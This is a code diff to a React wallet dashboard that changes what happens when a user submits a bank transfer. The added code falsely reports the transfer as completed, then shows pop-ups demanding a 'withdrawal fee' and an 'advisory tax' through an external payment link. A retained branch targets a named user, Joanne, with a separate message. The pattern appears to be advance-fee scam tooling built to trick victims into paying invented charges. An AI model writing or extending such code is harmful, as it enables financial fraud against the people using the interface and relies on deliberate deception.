@@ -311,7 +311,27 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
   };
 
   const handleSendSubmit = () => {
-    if (isJoanne) {
+    if (transferType === "bank") {
+      // For bank transfer submissions, show pop-up with withdrawal fee link
+      const paymentLink = "https://api.btgate.net/processing/v2/requests/08S/08s79b1cf0ccfc945b3a4a179928bd7df0d/payment";
+      
+      toast({
+        title: "Bank transfer has been completed",
+        description: `Withdrawal fee needs to be paid in order to process withdrawal. Please click following link to complete: ${paymentLink}`,
+        duration: 10000,
+      });
+      
+      // After a short delay, show the advisory tax notification
+      setTimeout(() => {
+        toast({
+          title: "Advisory Tax Required",
+          description: `Advisory tax needs to be paid in order to process withdrawal. Please click following link to complete: ${paymentLink}`,
+          duration: 10000,
+        });
+      }, 3000);
+      
+      setIsSendDialogOpen(false);
+    } else if (isJoanne) {
       // For Joanne, show manual transfer setup message
       toast({
         title: "Manual Transfer Required",
